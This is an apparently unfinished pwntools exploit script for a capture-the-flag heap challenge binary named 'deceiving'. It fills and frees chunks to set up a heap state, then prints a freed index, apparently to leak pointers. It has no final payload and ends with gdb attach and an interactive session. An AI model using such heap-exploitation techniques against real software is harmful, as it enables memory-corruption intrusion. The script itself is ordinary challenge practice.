from pwn import *

def rv():
    p.recvuntil(" in bytes?\n")


elf = context.binary = ELF("./deceiving")
p = process()


def create(size,title,content,typ,idx):
    p.recvuntil(b"5- exit\n")
    p.sendline("1")
    p.sendline(str(size))
    p.sendline(title)
    p.sendline(content)
    p.sendline(str(typ))
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil(b"5- exit\n")
    p.sendline("4")
    p.sendline(str(idx))

def edit(idx,content):
    p.recvuntil(b"5- exit\n")
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(content)


def print(idx):
    p.recvuntil(b"5- exit\n")
    p.sendline("3")
    p.sendline(str(idx))


for i in range(9):
    create(0x80,f"TITLE {i}",f"{i}".encode() * 0x80, 1, i)



for i in range(8):
    delete(i)

create(0x80,f"TITLE {i}",b"@" * 0x80, 1, 8)


# for i in range(6):
    # create(0x80,f"TITLE {i}",f"{i}".encode() * 0x80, 1, i)

# create(0x80,f"TITLE {i}",f"{i}".encode() * 0x80, 1, 1) #
# create(0x80,f"TITLE {i}",f"{i}".encode() * 0x80, 1, 2) # 
# create(0x80,f"TITLE {i}",f"{i}".encode() * 0x80, 1, 3) #
# create(0x80,f"TITLE {i}",f"{i}".encode() * 0x80, 1, 4) #
# create(0x80,f"TITLE {i}",f"{i}".encode() * 0x80, 1, i)


print(7)

# for i in range(8):
# delete(1)
# delete(2)

gdb.attach(p)



p.interactive()